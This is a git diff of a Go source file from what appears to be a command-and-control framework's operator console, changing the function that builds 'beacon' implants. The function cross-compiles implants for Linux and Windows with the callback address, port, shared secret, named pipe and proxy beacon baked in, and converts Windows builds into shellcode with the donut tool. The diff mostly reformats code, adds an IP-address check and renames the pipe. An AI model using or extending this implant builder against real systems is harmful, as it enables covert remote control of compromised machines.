@@ -2,15 +2,17 @@ package main
 
 import (
 	"bufio"
+	"fmt"
 	"os/exec"
-	"strings"
+	"regexp"
 	"strconv"
+	"strings"
 )
 
 var targets = []string{"linux", "windows"}
 
-var platforms = map[string][]string {
-	"linux": []string{"386", "amd64", "arm", "arm64"},
+var platforms = map[string][]string{
+	"linux":   []string{"386", "amd64", "arm", "arm64"},
 	"windows": []string{"386", "amd64"},
 }
 
@@ -34,7 +36,6 @@ func createBeacon(listener int, platform string, arch string, proxyIp string) {
 		target = platform
 	}
 
-
 	if arch == "" {
 		info("Pick arch")
 		listPlatforms(target)
@@ -52,18 +53,22 @@ func createBeacon(listener int, platform string, arch string, proxyIp string) {
 
 	info("Using " + target + "/" + targetArch)
 	input := "n"
-	
+
 	if proxyIp == "" && len(beacons) > 0 {
 		info("Proxy? (y/n)")
 		input = readLine()
 	}
 
-	ip := getIfaceIp(listeners[listener].Iface)
+	ip := listeners[listener].Iface
+	if !regexp.MustCompile(`(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}`).MatchString(listeners[listener].Iface) {
+		ip = getIfaceIp(listeners[listener].Iface)
+	}
+
 	port := strconv.Itoa(listeners[listener].Port)
 	beaconId := genRandID()
-	beaconName := beaconId//"beacon" + ip + "." + port	
+	beaconName := beaconId //"beacon" + ip + "." + port
 	buildFlags := ""
-	pipeName := "wman"
+	pipeName := "wmans"
 	var cmdHandle *exec.Cmd
 	var output string
 
@@ -73,7 +78,9 @@ func createBeacon(listener int, platform string, arch string, proxyIp string) {
 	}
 
 	if proxyIp != "" && proxyIp != "n" {
-		cmdHandle = exec.Command("/bin/sh", "-c", "cd beacon; env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + targetArch + " go build -ldflags '" + buildFlags + " -X main.pipeName=" + pipeName + " -X main.id=" + beaconId + " -X main.secret=" + string(securityContext.key) + " -X main.cmdProxyIp=" + proxyIp + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o ../out/" + beaconName)
+		cmm := "cd beacon; env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + targetArch + " go build -ldflags '" + buildFlags + " -X main.pipeName=" + pipeName + " -X main.id=" + beaconId + " -X main.secret=" + string(securityContext.key) + " -X main.cmdProxyIp=" + proxyIp + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o ../out/" + beaconName
+		fmt.Println(cmm)
+		cmdHandle = exec.Command("/bin/sh", "-c", cmm)
 	} else if input == "y" {
 		if len(beacons) == 0 {
 			info("No beacons to proxy to.")
@@ -93,18 +100,18 @@ func createBeacon(listener int, platform string, arch string, proxyIp string) {
 
 		notifyBeaconOfProxyUpdate(beacon, beaconId)
 		info("Using beacon " + beacon.Id + "@" + beacon.Ip + " as proxy.")
-		cmdHandle = exec.Command("/bin/sh", "-c", "cd beacon; env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + targetArch + " go build -ldflags '" + buildFlags + " -X main.pipeName=" + pipeName + " -X main.id=" + beaconId + " -X main.secret=" + string(securityContext.key) + " -X main.cmdProxyId=" + beacon.Id + " -X main.cmdProxyIp=" + beacon.Ip + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o ../out/" + beaconName)
+		cmdHandle = exec.Command("/bin/sh", "-c", "cd beacon; env CGO_ENABLED=0 GOOS="+target+" GOARCH="+targetArch+" go build -ldflags '"+buildFlags+" -X main.pipeName="+pipeName+" -X main.id="+beaconId+" -X main.secret="+string(securityContext.key)+" -X main.cmdProxyId="+beacon.Id+" -X main.cmdProxyIp="+beacon.Ip+" -X main.cmdAddress="+ip+" -X main.cmdPort="+port+" -X main.cmdHost=command.com' -o ../out/"+beaconName)
 	} else {
 		info("No proxy")
-		cmdHandle = exec.Command("/bin/sh", "-c", "cd beacon; env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + targetArch + " go build -ldflags '" + buildFlags + " -X main.pipeName=" + pipeName + " -X main.id=" + beaconId + " -X main.secret=" + string(securityContext.key) + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o ../out/" + beaconName)
+		cmdHandle = exec.Command("/bin/sh", "-c", "cd beacon; env CGO_ENABLED=0 GOOS="+target+" GOARCH="+targetArch+" go build -ldflags '"+buildFlags+" -X main.pipeName="+pipeName+" -X main.id="+beaconId+" -X main.secret="+string(securityContext.key)+" -X main.cmdAddress="+ip+" -X main.cmdPort="+port+" -X main.cmdHost=command.com' -o ../out/"+beaconName)
 	}
 
 	stderr, err := cmdHandle.StderrPipe()
 	stdout, err := cmdHandle.StdoutPipe()
-	
+
 	if err = cmdHandle.Start(); err == nil {
 		scanner := bufio.NewScanner(stderr)
-		
+
 		if err != nil {
 			output += scanner.Text()
 			output += "\n"
@@ -116,7 +123,7 @@ func createBeacon(listener int, platform string, arch string, proxyIp string) {
 		}
 
 		scanner = bufio.NewScanner(stdout)
-		
+
 		if err != nil {
 			output += scanner.Text()
 			output += "\n"
@@ -135,10 +142,10 @@ func createBeacon(listener int, platform string, arch string, proxyIp string) {
 	//beacon := &Beacon{"n/a", beaconId, nil, nil, nil, nil, time.Time{}}
 	// beacons = append(beacons, beacon)
 	info("Saved beacon for listener " + getIfaceIp(listeners[listener].Iface) + ":" + strconv.Itoa(listeners[listener].Port) + "%" + listeners[listener].Iface + " to out/" + beaconName)
-	
+
 	if target == "windows" {
 		output = ""
-		cmdHandle := exec.Command("/bin/sh", "-c", "./includes/donut -c TestModule2 -m Main out/" + beaconName + " -o out/" + beaconName + ".bin")
+		cmdHandle := exec.Command("/bin/sh", "-c", "./includes/donut -c TestModule2 -m Main out/"+beaconName+" -o out/"+beaconName+".bin")
 		stdout, err := cmdHandle.StdoutPipe()
 		stderr, err := cmdHandle.StderrPipe()
 
@@ -148,7 +155,7 @@ func createBeacon(listener int, platform string, arch string, proxyIp string) {
 				output += scanner.Text()
 				output += "\n"
 			}
-			
+
 			scanner = bufio.NewScanner(stderr)
 			for scanner.Scan() {
 				output += scanner.Text()
